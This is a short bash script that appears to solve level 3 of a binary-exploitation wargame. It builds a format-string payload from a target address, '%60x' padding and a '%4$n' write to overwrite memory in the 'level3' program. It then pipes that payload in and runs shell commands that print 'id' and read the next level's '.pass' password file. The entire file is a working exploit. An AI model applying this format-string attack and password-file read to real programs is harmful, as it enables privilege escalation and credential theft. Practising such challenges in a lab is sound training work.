#!/bin/bash

GETPASS="cat /home/user/level4/.pass"

set -x

WRITE_ADDRESS="\x8c\x98\x04\x08"
PADDING="%60x"
WRITE_MODIFIER='%4$n'

python -c "print('$WRITE_ADDRESS' + '$PADDING' + '$WRITE_MODIFIER')" > /tmp/exploit3

(cat /tmp/exploit3 - | ~/level3) << EOI
    echo "\nid: \$(id)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI